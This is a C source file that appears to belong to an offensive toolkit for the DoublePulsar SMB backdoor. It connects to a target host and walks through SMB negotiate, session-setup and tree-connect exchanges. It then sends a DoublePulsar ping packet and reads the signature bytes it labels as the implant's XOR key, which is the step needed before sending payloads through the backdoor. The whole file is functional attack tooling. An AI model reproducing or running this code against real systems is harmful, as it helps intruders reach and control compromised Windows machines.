#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

extern SOCKET smb_connect(const char *ip, int port);

static int smb_send_all(SOCKET socket_handle, const unsigned char *buffer, size_t length)
{
    size_t offset = 0;

    while (offset < length) {
        size_t remaining = length - offset;
        int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
        int sent = send(socket_handle, (const char *)buffer + offset, chunk, 0);

        if (sent == SOCKET_ERROR || sent == 0) {
            return -1;
        }
        offset += (size_t)sent;
    }

    return 0;
}

static int smb_receive_packet(SOCKET socket_handle, unsigned char *buffer,
                              size_t capacity, size_t *packet_length)
{
    size_t offset = 0;
    uint32_t payload_length;

    while (offset < 4) {
        int received = recv(socket_handle, (char *)buffer + offset,
                            (int)(4 - offset), 0);
        if (received == SOCKET_ERROR || received == 0) {
            return -1;
        }
        offset += (size_t)received;
    }

    payload_length = ((uint32_t)(buffer[1] & 0x01U) << 16) |
                     ((uint32_t)buffer[2] << 8) |
                     (uint32_t)buffer[3];

    if ((size_t)payload_length > capacity - 4) {
        return -1;
    }

    offset = 4;
    while (offset < (size_t)payload_length + 4) {
        size_t remaining = (size_t)payload_length + 4 - offset;
        int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
        int received = recv(socket_handle, (char *)buffer + offset, chunk, 0);

        if (received == SOCKET_ERROR || received == 0) {
            return -1;
        }
        offset += (size_t)received;
    }

    *packet_length = offset;
    return 0;
}

unsigned int DoublePulsarXORKeyCalculator(const char *ip, int port)
{
    SOCKET socket_handle = INVALID_SOCKET;
    unsigned char *response = NULL;
    size_t response_capacity = 131075U;
    size_t response_length = 0;
    unsigned char negotiate_packet[sizeof(SMB_NEGOTIATE_PKT)];
    unsigned char session_setup_packet[sizeof(SMB_SESSION_SETUP_PKT)];
    unsigned char tree_connect_packet[sizeof(SMB_TREE_CONNECT_PKT)];
    unsigned char ping_packet[sizeof(DP_PING_PKT)];
    unsigned char user_id[2];
    unsigned char tree_id[2];
    unsigned int result = 0;

    if (ip == NULL || port < 1 || port > 65535 ||
        sizeof(SMB_NEGOTIATE_PKT) < 2 ||
        sizeof(SMB_SESSION_SETUP_PKT) < 34 ||
        sizeof(SMB_TREE_CONNECT_PKT) < 34 ||
        sizeof(DP_PING_PKT) < 34 ||
        SMB_RESP_SIGNATURE_END - SMB_RESP_SIGNATURE_START != 4) {
        return 0;
    }

    socket_handle = smb_connect(ip, port);
    if (socket_handle == INVALID_SOCKET) {
        return 0;
    }

    response = (unsigned char *)malloc(response_capacity);
    if (response == NULL) {
        goto cleanup;
    }

    memcpy(negotiate_packet, SMB_NEGOTIATE_PKT, sizeof(SMB_NEGOTIATE_PKT));
    memcpy(session_setup_packet, SMB_SESSION_SETUP_PKT, sizeof(SMB_SESSION_SETUP_PKT));
    memcpy(tree_connect_packet, SMB_TREE_CONNECT_PKT, sizeof(SMB_TREE_CONNECT_PKT));
    memcpy(ping_packet, DP_PING_PKT, sizeof(DP_PING_PKT));

    if (smb_send_all(socket_handle, negotiate_packet,
                     sizeof(SMB_NEGOTIATE_PKT) - 1) != 0 ||
        smb_receive_packet(socket_handle, response, response_capacity,
                           &response_length) != 0) {
        goto cleanup;
    }

    if (smb_send_all(socket_handle, session_setup_packet,
                     sizeof(SMB_SESSION_SETUP_PKT) - 1) != 0 ||
        smb_receive_packet(socket_handle, response, response_capacity,
                           &response_length) != 0 ||
        response_length < 34) {
        goto cleanup;
    }

    user_id[0] = response[32];
    user_id[1] = response[33];
    tree_connect_packet[32] = user_id[0];
    tree_connect_packet[33] = user_id[1];

    if (smb_send_all(socket_handle, tree_connect_packet,
                     sizeof(SMB_TREE_CONNECT_PKT) - 1) != 0 ||
        smb_receive_packet(socket_handle, response, response_capacity,
                           &response_length) != 0 ||
        response_length < 34) {
        goto cleanup;
    }

    tree_id[0] = response[28];
    tree_id[1] = response[29];
    ping_packet[28] = tree_id[0];
    ping_packet[29] = tree_id[1];
    ping_packet[32] = user_id[0];
    ping_packet[33] = user_id[1];

    if (smb_send_all(socket_handle, ping_packet, sizeof(DP_PING_PKT) - 1) != 0 ||
        smb_receive_packet(socket_handle, response, response_capacity,
                           &response_length) != 0 ||
        SMB_RESP_SIGNATURE_END > response_length) {
        goto cleanup;
    }

    result = (unsigned int)response[SMB_RESP_SIGNATURE_START] |
             ((unsigned int)response[SMB_RESP_SIGNATURE_START + 1] << 8) |
             ((unsigned int)response[SMB_RESP_SIGNATURE_START + 2] << 16) |
             ((unsigned int)response[SMB_RESP_SIGNATURE_START + 3] << 24);

cleanup:
    free(response);
    closesocket(socket_handle);
    return result;
}